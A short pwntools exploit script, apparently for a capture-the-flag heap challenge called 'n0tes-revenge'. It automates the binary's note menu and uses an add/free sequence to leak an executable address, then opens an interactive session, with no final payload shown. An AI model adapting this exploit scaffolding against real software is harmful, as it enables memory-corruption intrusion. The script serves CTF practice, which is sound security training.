#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("n0tes-revenge")

local = True 
if local:
    p = process("./n0tes-revenge")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./n0tes-revenge', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

def add(data):
    sla(b'>>', b'1')
    sla(b'Content:', data)

def edit(offset, data):
    sla(b'>>', b'2')
    sla(b'Offset:', offset)
    sla(b'chars):', data)

def show():
    sla(b'>>', b'3')

def free():
    sla(b'>>', b'4')

add(b'a'*0xff)
free()
p.recvuntil(b'[delete_note@0x')
exe_leak = int(p.recv(12), 16)
log.info('Exe_leak:         ' + hex(exe_leak))
log.info('Banner_str_addr:  ' + hex(exe_leak + 0x1f2b))
add(b'b'*0xff)
p.interactive()